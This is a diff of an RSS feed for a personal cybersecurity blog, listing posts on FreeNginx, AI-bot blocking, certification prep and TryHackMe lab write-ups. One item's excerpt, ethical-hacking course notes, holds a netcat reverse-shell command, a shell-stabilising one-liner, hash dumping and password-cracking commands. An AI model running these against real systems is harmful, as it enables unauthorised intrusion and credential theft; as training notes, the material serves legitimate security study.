@@ -4,90 +4,65 @@
     <title>Posts on tox@box</title>
     <link>https://toxtech.me/posts/</link>
     <description>Recent content in Posts on tox@box</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 18 Feb 2024 23:14:55 -0500</lastBuildDate><atom:link href="https://toxtech.me/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 18 Feb 2024 23:14:55 -0500</lastBuildDate>
+    <atom:link href="https://toxtech.me/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>FreeNginx, the new fork of Nginx by Dounin</title>
       <link>https://toxtech.me/posts/freenginx/</link>
       <pubDate>Sun, 18 Feb 2024 23:14:55 -0500</pubDate>
-      
       <guid>https://toxtech.me/posts/freenginx/</guid>
       <description>One of the key developers of Nginx, the most popular web server in the world (managing 1/3 of all delivered &amp;amp; proxied web pages on the Internet), has announced his withdrawal from the project. Unlike the current Nginx project &amp;amp; its earlier fork named Angie, the new fork, named freenginx, aims to &amp;ldquo;be run by developers, and not corporate entities.&amp;rdquo; This comes after the acquisition of Nginx, Inc. by F5 in 2019, the same year two Nginx leaders were coincidentally detained and interrogated by the FSB (another story to research).</description>
     </item>
-    
     <item>
       <title>Using Dark Visitors to Safeguard from AI Bot Agents</title>
       <link>https://toxtech.me/posts/darkvisitorsai/</link>
       <pubDate>Sat, 06 Jan 2024 00:51:01 -0500</pubDate>
-      
       <guid>https://toxtech.me/posts/darkvisitorsai/</guid>
       <description>In the ever-evolving landscape of the internet, websites are constantly under the watchful eyes of various entities, including search engines and automated bots. While search engines play a crucial role in driving organic traffic to your site, not all bots have good intentions. Some automated agents, powered by artificial intelligence (AI), may scrape your website content for malicious purposes, including content theft, data mining, SEO manipulation, price scraping, vulnerability scanning, DDoS attacks, etc.</description>
     </item>
-    
     <item>
       <title>Get Free IT Certification Prep via Public Library</title>
       <link>https://toxtech.me/posts/freeudemy/</link>
       <pubDate>Fri, 15 Dec 2023 00:14:01 -0500</pubDate>
-      
       <guid>https://toxtech.me/posts/freeudemy/</guid>
-      <description>Are you struggling to find adequate resources to get certified in IT &amp;amp; Cybersecurity?
-In this blog post, we&amp;rsquo;ll walk step-by-step into the process of obtaining a free Udemy Business account, unlocking a load of new educational content for all the CompTIA &amp;amp; Cisco certifications your heart desires.
-For those of you reading from CVCC, we are a CompTIA Academic Partner &amp;ndash; any students serious about their career may take these certifications on their own time for cheap.</description>
+      <description>Are you struggling to find adequate resources to get certified in IT &amp;amp; Cybersecurity?&#xA;In this blog post, we&amp;rsquo;ll walk step-by-step into the process of obtaining a free Udemy Business account, unlocking a load of new educational content for all the CompTIA &amp;amp; Cisco certifications your heart desires.&#xA;For those of you reading from CVCC, we are a CompTIA Academic Partner &amp;ndash; any students serious about their career may take these certifications on their own time for cheap.</description>
     </item>
-    
     <item>
       <title>Practical Ethical Hacking Capstone NOTES</title>
       <link>https://toxtech.me/posts/pehcapstone/</link>
       <pubDate>Sat, 04 Nov 2023 00:00:00 +0000</pubDate>
-      
       <guid>https://toxtech.me/posts/pehcapstone/</guid>
-      <description>hashdump — dump all user hashes (alternative to /etc/shadow) nc -lvp 4444 — netcat listening verbose port 4444 nc 192.168.1.1 4444 -e bin/sh — netcat connect to 192.168.1.1 on port 4444, establish /bin/sh (cmd.exe) python3 -c &amp;lsquo;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo; to stabilize pseudo-shell  first use &amp;ldquo;which python&amp;rdquo; to check if python 3 is installed   /robots.txt for easy osint https://vk9-sec.com/ssh2john-how-to/ — tutorial for johntheripper ssh hash cracking:  /usr/share/john/ssh2john.py id_rsa &amp;gt; forjohn.</description>
+      <description>hashdump — dump all user hashes (alternative to /etc/shadow) nc -lvp 4444 — netcat listening verbose port 4444 nc 192.168.1.1 4444 -e bin/sh — netcat connect to 192.168.1.1 on port 4444, establish /bin/sh (cmd.exe) python3 -c &amp;lsquo;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo; to stabilize pseudo-shell first use &amp;ldquo;which python&amp;rdquo; to check if python 3 is installed /robots.txt for easy osint https://vk9-sec.com/ssh2john-how-to/ — tutorial for johntheripper ssh hash cracking: /usr/share/john/ssh2john.py id_rsa &amp;gt; forjohn.txt john --wordlist=/home/kali/rockyou.</description>
     </item>
-    
     <item>
       <title>TryHackMe Writeup | Expose</title>
       <link>https://toxtech.me/posts/expose/</link>
       <pubDate>Sun, 15 Oct 2023 00:47:04 -0400</pubDate>
-      
       <guid>https://toxtech.me/posts/expose/</guid>
-      <description>Introduction/Overview  Challenge Name: Expose My Rating: Medium Category: Linux exploitation /etc/hosts: expose.thm Author: 1337rce Description: Use your red teaming knowledge to pwn a Linux machine.  Scanning/Recon &amp;amp; Initial Exploitation As per usual, we start with a broad nmap scan of all ports with nmap -p- expose.thm, which returns us something similar to the following:
-PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 53/tcp open domain 1337/tcp open waste 1883/tcp open mqtt After investigating tcp port 1337 with nmap expose.</description>
+      <description>Introduction/Overview Challenge Name: Expose My Rating: Medium Category: Linux exploitation /etc/hosts: expose.thm Author: 1337rce Description: Use your red teaming knowledge to pwn a Linux machine. Scanning/Recon &amp;amp; Initial Exploitation As per usual, we start with a broad nmap scan of all ports with nmap -p- expose.thm, which returns us something similar to the following:&#xA;PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 53/tcp open domain 1337/tcp open waste 1883/tcp open mqtt After investigating tcp port 1337 with nmap expose.</description>
     </item>
-    
     <item>
       <title>TryHackMe Writeup | Net Sec Challenge</title>
       <link>https://toxtech.me/posts/netsecchallenge/</link>
       <pubDate>Sat, 14 Oct 2023 17:27:51 -0400</pubDate>
-      
       <guid>https://toxtech.me/posts/netsecchallenge/</guid>
-      <description>Introduction/Overview   Challenge Name: Net Sec Challenge
-  Description: Basic Enumeration of a box, meant as practice of Network Security concepts. Completed only using nmap &amp;amp; hydra.
-  IP Address: 10.10.57.45 (Example)
-  Enumeration  Web Application:  URL: http://10.10.57.45 (Example)   Vulnerabilities:  Identify any potential vulnerabilities or misconfigurations.    [Question 1.1] Launch the AttackBox and the target VM.
- No answer needed, simply click the button   [Question 2.</description>
+      <description>Introduction/Overview Challenge Name: Net Sec Challenge&#xA;Description: Basic Enumeration of a box, meant as practice of Network Security concepts. Completed only using nmap &amp;amp; hydra.&#xA;IP Address: 10.10.57.45 (Example)&#xA;Enumeration Web Application: URL: http://10.10.57.45 (Example) Vulnerabilities: Identify any potential vulnerabilities or misconfigurations. [Question 1.1] Launch the AttackBox and the target VM.&#xA;No answer needed, simply click the button [Question 2.1] What is the highest port number being open less than 10,000?</description>
     </item>
-    
     <item>
       <title>TryHackMe Writeup | Internal (Hard)</title>
       <link>https://toxtech.me/posts/internal/</link>
       <pubDate>Thu, 12 Oct 2023 23:10:05 -0400</pubDate>
-      
       <guid>https://toxtech.me/posts/internal/</guid>
-      <description>Introduction/Overview   Challenge Name: TryHackMe Category: Penetration Testing Challenge Points: 60 Author: TheMayor Description: Complex Linux &amp;amp; Docker exploitation without the usage of metasploit (usage of CVE-2021-4034).  Scanning/Recon  IP Address: 10.10.174.253  Inital scan with nmap -p- 10.10.174.253 and later nmap -A -p 22,80, resulting in
-PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6efaefbef65f98b9597bf78eb9c5621e (RSA) | 256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA) |_ 256 b07f7f7b5262622a60d43d36fa89eeff (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80/tcp open http Apache httpd 2.</description>
+      <description>Introduction/Overview Challenge Name: TryHackMe Category: Penetration Testing Challenge Points: 60 Author: TheMayor Description: Complex Linux &amp;amp; Docker exploitation without the usage of metasploit (usage of CVE-2021-4034). Scanning/Recon IP Address: 10.10.174.253 Inital scan with nmap -p- 10.10.174.253 and later nmap -A -p 22,80, resulting in&#xA;PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6efaefbef65f98b9597bf78eb9c5621e (RSA) | 256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA) |_ 256 b07f7f7b5262622a60d43d36fa89eeff (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80/tcp open http Apache httpd 2.</description>
     </item>
-    
     <item>
       <title>Welcome!</title>
       <link>https://toxtech.me/posts/welcome/</link>
       <pubDate>Sun, 08 Oct 2023 14:55:42 -0400</pubDate>
-      
       <guid>https://toxtech.me/posts/welcome/</guid>
-      <description>Welcome to pwnedbytoxic Welcome to pwnedbytoxic, my personal blog and writeup library wherein we explore &amp;amp; expose the vast knowledge pool of cybersecurity.
-About pwnedbytoxic At pwnedbytoxic, I&amp;rsquo;m on a mission to make the internet a safer place, one byte at a time. I&amp;rsquo;m Damon Hoody (aka &amp;ldquo;toxic&amp;rdquo;), your host, and guide through the exciting and ever-evolving landscape of cybersecurity.
-What is Cybersecurity? Cybersecurity is the practice of protecting digital systems, networks, and data from malicious attacks, unauthorized access, and data breaches.</description>
+      <description>Welcome to pwnedbytoxic Welcome to pwnedbytoxic, my personal blog and writeup library wherein we explore &amp;amp; expose the vast knowledge pool of cybersecurity.&#xA;About pwnedbytoxic At pwnedbytoxic, I&amp;rsquo;m on a mission to make the internet a safer place, one byte at a time. I&amp;rsquo;m Damon Hoody (aka &amp;ldquo;toxic&amp;rdquo;), your host, and guide through the exciting and ever-evolving landscape of cybersecurity.&#xA;What is Cybersecurity? Cybersecurity is the practice of protecting digital systems, networks, and data from malicious attacks, unauthorized access, and data breaches.</description>
     </item>
-    
   </channel>
 </rss>
